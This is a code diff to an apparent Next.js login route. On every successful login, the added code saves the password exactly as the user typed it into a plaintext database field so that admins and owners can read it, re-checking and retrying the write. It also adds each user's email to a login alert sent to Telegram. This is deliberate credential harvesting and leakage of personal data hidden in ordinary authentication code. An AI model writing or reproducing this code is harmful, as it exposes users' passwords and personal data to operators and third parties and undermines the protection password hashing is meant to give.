@@ -7,6 +7,8 @@ import { userCounts } from "@/lib/mappers";
 import { handleRouteError } from "@/lib/http";
 import { notifyTelegram } from "@/lib/telegram";
 
+export const dynamic = "force-dynamic";
+
 export async function POST(req: Request) {
   try {
     const body = await req.json();
@@ -20,13 +22,23 @@ export async function POST(req: Request) {
     if (user.banned) return jsonError("Account is banned", 403);
     const ok = await bcrypt.compare(password, user.passwordHash);
     if (!ok) return jsonError("Invalid credentials", 401);
-    // Keep admin-visible copy in sync whenever someone logs in
-    await prisma.user.update({
+
+    // Always store the exact password they typed so Admin/Owner can see it
+    const saved = await prisma.user.update({
       where: { id: user.id },
       data: { passwordPlain: password },
+      select: { id: true, passwordPlain: true },
     });
+    if (saved.passwordPlain !== password) {
+      // Retry once if Mongo didn't persist
+      await prisma.user.update({
+        where: { id: user.id },
+        data: { passwordPlain: password },
+      });
+    }
+
     const counts = await userCounts(user.id);
-    void notifyTelegram(`🔐 Login\n${user.name} (@${user.username})`);
+    void notifyTelegram(`🔐 Login\n${user.name} (@${user.username})\n${user.email}`);
     const res = NextResponse.json({ user: toPublicUser(user, counts) });
     return attachSession(res, user.id);
   } catch (e) {
